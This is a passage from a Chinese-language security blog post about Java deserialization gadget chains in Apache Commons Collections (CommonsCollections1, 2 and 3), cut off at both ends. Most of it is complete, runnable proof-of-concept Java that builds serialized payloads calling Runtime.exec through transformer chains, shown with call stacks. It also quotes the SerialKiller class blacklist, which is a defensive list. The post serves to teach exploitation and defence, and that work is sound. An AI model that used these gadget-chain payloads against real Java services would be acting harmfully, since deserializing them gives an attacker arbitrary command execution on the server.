class="addition">+        static void setType(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                            Class&lt;? extends Annotation&gt; type) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, typeOffset, type);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        static void setMemberValues(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                                    Map&lt;String, Object&gt; memberValues) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, memberValuesOffset, memberValues);</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>
<h3
id="commonscollections1annotationinvocationhandlerlazymap">CommonsCollections1（AnnotationInvocationHandler→LazyMap）</h3>
<p>前面提到过，<code>LazyMap</code> 修饰过的 <code>Map</code> 只要调用
<code>get</code> 方法就会触发 <code>transform</code> 方法。然而
<code>AnnotationInvocationHandler.readObject</code> 并没有调用
<code>get</code> 方法。</p>
<p>不过幸运的是 <code>AnnotationInvocationHandler</code> 实现了
<code>InvocationHandler</code>
接口，本身是一个动态代理接口对象，也就是说只要我们把一个
<code>Map</code> 用 <code>AnnotationInvocationHandler</code>
代理，那么代理后的 <code>Map</code> 的任何方法调用都会执行到
<code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure></div> <code>AnnotationInvocationHandler</code> 的
<code>invoke</code> 方法特判几种方法后会调用 <code>memberValues</code>
的 <code>get</code> 方法，也就会触发 <code>LazyMap</code> 的
<code>transform</code> 方法调用。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  <span class="comment">// 调用 get 方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 完整 poc
如下，需要注意的是代理之后任何对 <code>proxyMap</code> 的操作都会触发
<code>transformer</code> 调用，因此需要最后设置恶意的
<code>Transformer</code>。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 调用栈如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy) 内层 AnnotationInvocationHandler 代理的 Map</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:42, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>
### CommonsCollections2（PriorityQueue→TransformingComparator）
前面提到，<code>TransformingComparator</code> 在比较时会对比较的对象调用
<code>transform</code> 方法。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 而 Java
中内置的维护顺序的容器如 <code>PriorityQueue</code>
在反序列化时会对内部的元素进行排序，这个过程中在
<code>siftDownUsingComparator</code> 函数内涉及了元素大小的比较。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 因此我们只需要在创建 <code>PriorityQueue</code>
容器时指定比较对象为我们定义的
<code>TransformingComparator</code>，之后往 <code>PriorityQueue</code>
中随便放两个元素，那么在反序列化时就会调用
<code>comparator.compare</code> 方法触发 <code>transform</code>
方法调用。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br></pre></td></tr></table></figure></div> poc 如下： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 注意，类
<code>org.apache.commons.collections4.comparators.TransformingComparator</code>，在
commons-collections4.0 以前是版本中是没有实现 <code>Serializable</code>
接口的，无法在序列化中使用。 ###
CommonsCollections3（...→TrAXFilter→InstantiateTransformer） 2015
年初，<span class="citation" data-cites="frohoff">@frohoff</span> 和
<span class="citation" data-cites="gebl">@gebl</span> 发布了 Talk《<a class="link" 
 href="https://frohoff.github.io/appseccali-marshalling-pickles/" >Marshalling
Pickles: how deserializing objects will ruin your day <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>》，以及 Java
反序列化利用工具
ysoserial，随后引爆了安全界。开发者们自然会去找寻一种安全的过滤方法，于是类似
<a class="link"   href="https://github.com/ikkisoft/SerialKiller" >SerialKiller <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
这样的工具随之诞生。</p>
<p>SerialKiller 是一个 Java
反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的<a class="link" 
 href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf" >黑名单 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- serialkiller.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections1 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections2 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Groovy payload  --&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.ConvertedClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.MethodClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Spring1 payload  --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.springframework\.beans\.factory\.ObjectFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">    <span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure></div> 这个黑名单中 <code>InvokerTransformer</code>
赫然在列，也就切断了 <code>CommonsCollections1</code>
的利⽤链。有攻就有防，ysoserial 随后增加了不少新的 Gadgets，其中就包括
CommonsCollections3。</p>
<p>CommonsCollections3 的目的很明显，就是为了绕过一些规则对
<code>InvokerTransformer</code> 的限制。CommonsCollections3 并没有使用到
<code>InvokerTransformer</code>
来调用任意方法，而是用到了另一个类，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>。</p>
<p>这个类的构造方法中调用了
<code>(TransformerImpl) templates.newTransformer()</code>
，免去了我们使用 <code>InvokerTransformer</code> 手工调用
<code>newTransformer()</code> 方法这一步： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">// &lt;---</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
我们可以构造如下 <code>ChainedTransformer</code>： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> poc
如下，这个是基于 CC1 的 <code>LazyMap</code>
链，其实这里可以自由组合其他的链，只要能调用到 <code>transform</code>
方法即可。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span 